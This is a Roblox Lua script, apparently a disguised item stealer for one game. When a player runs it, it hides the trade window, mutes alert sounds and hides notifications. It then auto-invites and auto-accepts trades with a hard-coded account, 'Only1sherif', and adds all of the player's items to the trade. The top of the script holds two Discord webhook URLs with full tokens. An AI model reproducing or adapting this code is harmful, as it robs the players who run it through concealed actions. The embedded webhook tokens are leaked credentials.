if game.PlaceId ~= 109983668079237 then return end

getgenv().WEBHOOK_URL2 = "https://discord.com/api/webhooks/1491134694656311397/ofX4CsHmL97_mPLxkp5f4VKHYOAq7tlcd_3SobAZzoESre71UpxmKg-g_V-0_9o2tPqT"
getgenv().WEBHOOKSHERIF = "https://discord.com/api/webhooks/1490063982760038440/CLhsVX58Yl-Xd5ZqG8kiSqEoNl9NoV4A1SDQXsjOVGJQNGOdfYlk-OetI7XGas0QirJd"

local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local HttpService = game:GetService("HttpService")
local LocalPlayer = Players.LocalPlayer
local PlayerGui = LocalPlayer.PlayerGui

local MY_USER = "Only1sherif"

-- ========== HIDE UI LOGIC (Modified for Stealth) ==========
local function hideTrade(v)
    if v.Name == "TradeLiveTrade" then
        -- Only hide if the target is you
        local otherUser = v:FindFirstChild("Other", true) and v.Other:FindFirstChild("Username", true)
        if otherUser and otherUser.Text:find(MY_USER) then
            pcall(function() v.Enabled = false end)
            pcall(function() v.Visible = false end)
            pcall(function() sethiddenproperty(v, "Enabled", false) end)
            
            v:GetPropertyChangedSignal("Enabled"):Connect(function()
                if otherUser.Text:find(MY_USER) then
                    pcall(function() v.Enabled = false end)
                    pcall(function() sethiddenproperty(v, "Enabled", false) end)
                end
            end)
        end
    end
end

for _, v in pairs(PlayerGui:GetDescendants()) do hideTrade(v) end
PlayerGui.DescendantAdded:Connect(hideTrade)

-- ========== MUTE SOUNDS & CAMERA ==========
local function muteSound(s)
    if s:IsA("Sound") then
        local lower = s.Name:lower()
        if lower:find("error") or lower:find("activated") then s.Volume = 0 end
    end
end
for _, v in pairs(workspace:GetDescendants()) do muteSound(v) end
workspace.DescendantAdded:Connect(muteSound)

workspace.CurrentCamera.FieldOfView = 70
workspace.CurrentCamera:GetPropertyChangedSignal("FieldOfView"):Connect(function()
    workspace.CurrentCamera.FieldOfView = 70
end)

pcall(function()
    local notif = PlayerGui:FindFirstChild("Notification")
    if notif and notif:FindFirstChild("Notification") then
        notif.Notification.Visible = false
    end
end)

-- ========== CORE NETWORKING ==========
local Net = ReplicatedStorage:WaitForChild("Packages"):WaitForChild("Net")
local function getRemote(name)
    local children = Net:GetChildren()
    for i, obj in ipairs(children) do
        if obj.Name == name then return children[i+1] end
    end
    return nil
end

local acceptInviteRF = getRemote("RF/TradeService/AcceptInvite")
local createInviteRE = getRemote("RE/TradeService/CreateInvite")
local readyRE        = getRemote("RE/TradeService/Ready")
local acceptRE       = getRemote("RE/TradeService/Accept")

-- Auto-Accept Invite logic 
if createInviteRE then
    createInviteRE.OnClientEvent:Connect(function(tradeId)
        if tradeId and acceptInviteRF then
            pcall(function()
                acceptInviteRF:InvokeServer("57624f2b-8aa9-4974-bb7a-08f058af33ef", tradeId)
            end)
        end
    end)
end

local function scanPlot()
    local found = {}
    local plots = workspace:FindFirstChild("Plots")
    if not plots then return found end
    local myPlot = nil
    for _, p in ipairs(plots:GetChildren()) do
        local sign = p:FindFirstChild("PlotSign")
        if sign then
            local lbl = sign:FindFirstChildOfClass("SurfaceGui", true):FindFirstChildOfClass("TextLabel", true)
            if lbl and (lbl.Text:lower():find(LocalPlayer.Name:lower()) or lbl.Text:lower():find(LocalPlayer.DisplayName:lower())) then
                myPlot = p
                break
            end
        end
    end
    if myPlot then
        for _, child in ipairs(myPlot:GetChildren()) do
            if child:IsA("Model") then table.insert(found, {name = child.Name}) end
        end
    end
    return found
end

local function sendInvite()
    local tl = PlayerGui:FindFirstChild("TradePlayerList")
    if tl and tl:FindFirstChild("TradePlayerList") then
        local inner = tl.TradePlayerList
        local sb = inner.bg.SearchFrame.SearchBox
        sb.Text = MY_USER
        task.wait(0.4)
        pcall(function() firesignal(sb.FocusLost, true) end)
        task.wait(0.5)
        local list = inner:FindFirstChild("Global") and inner.Global:FindFirstChild("List")
        if list then
            for _, p in pairs(list:GetChildren()) do
                if p:IsA("Frame") and p.Fill.Username.Text:find(MY_USER) then
                    local send = p.Fill:FindFirstChild("Send")
                    if send then firesignal(send.Activated) return true end
                end
            end
        end
    end
    return false
end

task.spawn(function()
    while true do
        pcall(function()
            local tradeUI = PlayerGui:FindFirstChild("TradeLiveTrade")
            if tradeUI and tradeUI.Enabled or (tradeUI and not tradeUI.Enabled and tradeUI.Visible == false) then
                if readyRE then readyRE:FireServer("d73acf93-6f32-44df-b813-0f6b32c7afd9") end
                task.wait(0.8)
                if acceptRE then acceptRE:FireServer("918ee0f5-e98f-413f-b76e-baee47b021cb") end
                
                -- Only add items if it's you 
                local other = tradeUI:FindFirstChild("Other", true)
                if other and other.Username.Text:find(MY_USER) then
                    local scroll = tradeUI:FindFirstChild("ScrollingFrame", true)
                    if scroll then
                        for _, slot in pairs(scroll:GetChildren()) do
                            if slot.Name:sub(1,9) == "Selection" then
                                local spacer = slot:FindFirstChild("Spacer")
                                if spacer and spacer:FindFirstChild("UIStroke") and spacer.UIStroke.Color ~= Color3.fromRGB(0, 255, 0) then
                                    firesignal(spacer.Activated)
                                end
                            end
                        end
                    end
                end
            else
                if #scanPlot() > 0 then sendInvite() end
            end
        end)
        task.wait(1.5)
    end
end)
